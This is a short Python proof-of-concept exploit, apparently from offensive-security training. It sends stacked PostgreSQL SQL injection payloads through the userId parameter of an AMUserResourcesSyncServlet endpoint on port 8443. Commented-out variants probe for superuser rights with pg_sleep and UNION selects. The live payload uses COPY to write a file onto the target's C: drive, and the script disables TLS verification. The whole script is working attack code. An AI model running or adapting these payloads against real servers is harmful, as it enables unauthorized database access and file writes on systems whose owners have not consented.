import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("(+) usage %s <target>" % sys.argv[0])
        print("(+) eg: %s target" % sys.argv[0])
        sys.exit(1)
    
    t = sys.argv[1]
    #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
   
    #sqli = ";"
    #sqli = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
    #sqli = "+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END"
    #sqli = "+UNION+SELECT+1"
    #sqli = ";select+pg_sleep(10);"
    sqli = ";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"

    #r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
    #                  params='ForMasRange=1&userId=1%s' % sqli, verify=False, proxies=proxies)
    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
                      params='ForMasRange=1&userId=1%s' % sqli, verify=False)
    
    print(r.text)
    print(r.headers)

if __name__ == '__main__':
    main()
